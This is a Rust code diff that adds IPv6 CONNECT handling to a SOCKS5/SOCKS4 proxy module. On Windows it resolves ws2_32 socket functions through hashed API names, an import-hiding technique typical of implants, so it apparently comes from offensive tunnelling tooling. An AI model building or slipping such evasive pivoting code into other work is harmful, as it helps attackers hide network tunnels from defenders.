@@ -148,7 +148,6 @@ impl SocksProxy {
                 }
 
                 let atyp = data[3];
-                let mut ip_bytes = [0u8; 4];
                 let mut port_bytes = [0u8; 2];
 
                 match atyp {
@@ -157,22 +156,39 @@ impl SocksProxy {
                         if data.len() < 10 {
                             return Vec::new();
                         }
+                        let mut ip_bytes = [0u8; 4];
                         ip_bytes.copy_from_slice(&data[4..8]);
                         port_bytes.copy_from_slice(&data[8..10]);
+                        let port = u16::from_be_bytes(port_bytes);
+                        if self.tcp_connect_v4(ip_bytes, port).is_ok() {
+                            self.state = SocksState::Forwarding;
+                            Vec::from([0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
+                        } else {
+                            self.state = SocksState::Error;
+                            Vec::from([0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
+                        }
+                    }
+                    0x04 => {
+                        // IPv6
+                        if data.len() < 4 + 16 + 2 {
+                            return Vec::new();
+                        }
+                        let mut ip_bytes = [0u8; 16];
+                        ip_bytes.copy_from_slice(&data[4..20]);
+                        port_bytes.copy_from_slice(&data[20..22]);
+                        let port = u16::from_be_bytes(port_bytes);
+                        if self.tcp_connect_v6(ip_bytes, port).is_ok() {
+                            self.state = SocksState::Forwarding;
+                            Vec::from([0x05, 0x00, 0x00, 0x04, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])
+                        } else {
+                            self.state = SocksState::Error;
+                            Vec::from([0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
+                        }
                     }
                     _ => {
-                        // Simplified: Only support IPv4 for now
+                        // Address type not supported
                         return Vec::from([0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0]);
                     }
-                }
-
-                let port = u16::from_be_bytes(port_bytes);
-                if self.tcp_connect(ip_bytes, port).is_ok() {
-                    self.state = SocksState::Forwarding;
-                    Vec::from([0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
-                } else {
-                    self.state = SocksState::Error;
-                    Vec::from([0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0]) // Host unreachable
                 }
             }
             0x04 => {
@@ -191,7 +207,7 @@ impl SocksProxy {
                 ip_bytes.copy_from_slice(&data[4..8]);
 
                 let port = u16::from_be_bytes(port_bytes);
-                if self.tcp_connect(ip_bytes, port).is_ok() {
+                if self.tcp_connect_v4(ip_bytes, port).is_ok() {
                     self.state = SocksState::Forwarding;
                     Vec::from([0x00, 0x5A, 0, 0, 0, 0, 0, 0]) // Request granted
                 } else {
@@ -206,7 +222,7 @@ impl SocksProxy {
         }
     }
 
-    fn tcp_connect(&mut self, ip: [u8; 4], port: u16) -> Result<(), ()> {
+    fn tcp_connect_v4(&mut self, ip: [u8; 4], port: u16) -> Result<(), ()> {
         #[cfg(not(target_os = "windows"))]
         unsafe {
             let sock = sys_socket(2, 1, 0); // AF_INET, SOCK_STREAM
@@ -265,6 +281,78 @@ impl SocksProxy {
                 sock,
                 &addr as *const _ as *const u8,
                 16,
+            ) == 0
+            {
+                self.fd = Some(sock);
+                Ok(())
+            } else {
+                let closesocket = resolve_function(ws2_32, hash_str(b"closesocket"));
+                if !closesocket.is_null() {
+                    type FnCloseSocket = unsafe extern "system" fn(HANDLE) -> i32;
+                    core::mem::transmute::<_, FnCloseSocket>(closesocket)(sock);
+                }
+                Err(())
+            }
+        }
+    }
+
+    fn tcp_connect_v6(&mut self, ip: [u8; 16], port: u16) -> Result<(), ()> {
+        #[cfg(not(target_os = "windows"))]
+        unsafe {
+            let sock = sys_socket(10, 1, 0); // AF_INET6=10, SOCK_STREAM=1
+            if (sock as isize) < 0 {
+                return Err(());
+            }
+
+            let mut addr = crate::utils::syscalls::SockAddrIn6 {
+                sin6_family: 10,
+                sin6_port: port.to_be(),
+                sin6_flowinfo: 0,
+                sin6_addr: [0; 16],
+                sin6_scope_id: 0,
+            };
+            addr.sin6_addr.copy_from_slice(&ip);
+
+            if sys_connect(sock, &addr as *const _ as *const u8, 28) == 0 {
+                self.fd = Some(sock);
+                Ok(())
+            } else {
+                sys_close(sock);
+                Err(())
+            }
+        }
+
+        #[cfg(target_os = "windows")]
+        unsafe {
+            let ws2_32 = hash_str(b"ws2_32.dll");
+            let socket_fn = resolve_function(ws2_32, hash_str(b"socket"));
+            let connect_fn = resolve_function(ws2_32, hash_str(b"connect"));
+
+            if socket_fn.is_null() || connect_fn.is_null() {
+                return Err(());
+            }
+
+            type FnSocket = unsafe extern "system" fn(i32, i32, i32) -> HANDLE;
+            type FnConnect = unsafe extern "system" fn(HANDLE, *const u8, i32) -> i32;
+
+            let sock = core::mem::transmute::<_, FnSocket>(socket_fn)(23, 1, 0); // AF_INET6=23
+            if sock == (-1isize as HANDLE) {
+                return Err(());
+            }
+
+            let mut addr = crate::utils::syscalls::SockAddrIn6 {
+                sin6_family: 23,
+                sin6_port: port.to_be(),
+                sin6_flowinfo: 0,
+                sin6_addr: [0; 16],
+                sin6_scope_id: 0,
+            };
+            addr.sin6_addr.copy_from_slice(&ip);
+
+            if core::mem::transmute::<_, FnConnect>(connect_fn)(
+                sock,
+                &addr as *const _ as *const u8,
+                28,
             ) == 0
             {
                 self.fd = Some(sock);
